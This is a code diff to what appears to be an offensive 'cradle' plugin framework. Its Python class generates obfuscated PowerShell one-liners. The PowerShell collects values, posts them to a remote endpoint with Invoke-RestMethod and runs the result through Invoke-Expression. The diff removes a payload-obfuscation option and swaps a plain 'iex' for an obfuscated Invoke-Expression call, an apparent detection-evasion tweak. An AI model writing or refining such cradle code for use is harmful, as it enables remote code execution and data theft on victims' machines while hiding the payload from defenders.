@@ -12,11 +12,6 @@ class BaseCradlePlugin(ABC):
     CONTENT_TYPE: str = "text/plain"
     
     OPTIONS: Dict[str, Dict[str, Any]] = {
-        "CONTENT_OBFUSCATION": {
-            "description": "Payload obfuscation applied by the core before serving",
-            "default": "getrandom",
-            "restricted_to": ["none","base64","char","getrandom"]
-        },
         "CRADLE_OBFUSCATION": {
             "description": "Cradle command obfuscation applied by the core before serving",
             "default": "getrandom",
@@ -56,12 +51,12 @@ $responseJson = @{{
 {"\n".join(f"\t{x} = {header_var_dict[x]} | Out-String" for x in header_var_dict.keys())}
 }} | ConvertTo-Json; Invoke-RestMethod -Uri "{self._endpoint_registry.get_cradle_command(notification_channel.uid)}" -Method Post -Body $responseJson
         """
-        return f"({sgr(snippet)})|iex;"
+        return f"({sgr(snippet)})|.({sgr("Invoke-Expression")});"
 
     
     def validate(self, inst: CradleInstance, options: dict) -> List[str]:
         errors = []
-        merged = self.get_options_with_defaults(inst)
+        merged = self.get_options_with_defaults(inst) | options
         for name, spec in self.OPTIONS.items():
             if spec.get("required", False) and not merged.get(name, ""):
                 errors.append(f"Required option '{name}' is not set")
